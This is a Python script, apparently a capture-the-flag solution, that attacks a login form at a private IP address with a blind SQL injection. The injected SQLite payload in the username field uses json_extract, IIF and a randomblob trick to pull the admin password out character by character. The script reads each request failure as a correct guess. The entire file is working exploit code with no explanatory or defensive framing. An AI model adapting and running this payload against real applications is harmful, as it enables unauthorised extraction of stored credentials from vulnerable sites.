from requests import *
from string import *
from tqdm import *


strings = ascii_letters + digits + punctuation
url = "http://10.113.184.121:10081/login"

flag = ""
for i in trange(27):
    if i == 26:
        flag += "}"
        break
    else:
        for string in strings:
            payload = f"admin.username\") as a,   json_extract(users, '$.admin.username') as b,   json_extract(users, '$.admin.password') as c FROM db  WHERE    b = 'admin'    AND IIF(substr(c, 1, {i + 1}) = '{flag + string}', (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # "

            # payload = "admin.username\") as a,   json_extract(users, '$.admin.username') as b,   json_extract(users, '$.admin.password') as c FROM db  WHERE    b = 'admin'    AND IIF(length(c) = 27, (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # "
            
            # print(payload)

            try:
                r = post(url=url, data={"username" : payload, "password" : "guest"})
            except:
                flag += string
                # print(flag)
                break
print(flag)